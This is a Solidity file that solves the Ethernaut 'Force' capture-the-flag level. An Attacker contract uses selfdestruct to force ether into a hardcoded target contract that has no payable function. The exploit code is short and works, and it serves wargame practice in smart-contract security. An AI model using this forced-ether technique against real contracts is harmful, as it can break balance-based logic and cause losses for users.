// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {
  /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract Attacker {
  Force public vulnerableContract = Force(0xD948e906516c1E42be957804329742E828D532ce); // ethernaut vulnerable contract

  function attack() external payable {
    address payable addr = payable(address(vulnerableContract));
    selfdestruct(addr);
  }
}